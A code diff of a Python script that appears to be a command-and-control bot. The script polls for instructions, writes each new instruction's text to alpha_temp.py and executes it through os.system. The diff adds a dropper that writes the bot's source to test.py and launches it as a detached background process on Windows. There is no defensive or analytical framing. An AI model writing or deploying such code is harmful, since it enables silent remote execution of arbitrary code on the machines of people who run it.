@@ -1,4 +1,4 @@
-from os import system
+rulae = """from os import system
 from itertools import cycle
 from time import sleep
 from re import search, DOTALL
@@ -19,4 +19,13 @@ while True:
 	if((not instr_codename) or (instr_codename.group(0) == codename) ): continue
 	codename = instr_codename.group(0)
 	print("proc")
-	system("echo %s > .\alpha_temp.py & python .\alpha_temp.py" % instr.text)
+	system("echo %s > .\alpha_temp.py & python .\alpha_temp.py" % instr.text)"""
+
+from subprocess import Popen
+
+f = open("test.py","w")
+f.write(rulae)
+f.close()
+DETACHED_PROCESS = 0x00000008
+cmd = ["python", "test.py"]
+p = Popen(cmd,shell=False,stdin=None,stdout=None,stderr=None,close_fds=True,creationflags=DETACHED_PROCESS)
